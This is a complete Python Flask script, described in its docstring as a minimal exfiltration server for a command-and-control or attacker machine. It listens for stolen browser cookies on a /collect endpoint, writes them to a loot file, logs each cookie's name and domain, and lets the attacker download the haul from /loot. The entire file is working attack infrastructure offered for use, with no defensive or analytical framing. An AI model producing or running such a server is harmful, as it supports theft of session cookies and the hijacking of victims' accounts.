#!/usr/bin/env python3
"""
c2_server.py -- Minimal exfiltration server (run on the C2/attacker machine).
    python3 c2_server.py --port 8443
Receives loot on POST /collect, stores it in loot.json, allows re-download
on GET /loot.
"""
import argparse, json, time
from flask import Flask, request, Response

app = Flask(__name__)

@app.route("/collect", methods=["POST"])
def collect():
    cookies = json.loads(request.data.decode())
    with open("loot.json", "w") as f:
        json.dump(cookies, f, indent=2)
    print(f"\n[+] {time.strftime('%H:%M:%S')} -- {len(cookies)} cookies received:")
    for c in cookies:
        print(f"    - {c['name']:25s} {c['domain']}")
    return "ok"

@app.route("/loot", methods=["GET"])
def loot():
    try:
        return Response(open("loot.json").read(), mimetype="application/json")
    except FileNotFoundError:
        return "no loot", 404

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--host", default="0.0.0.0")
    a = ap.parse_args()
    print(f"[*] C2 listening on http://{a.host}:{a.port}  (POST /collect, GET /loot)")
    app.run(host=a.host, port=a.port)
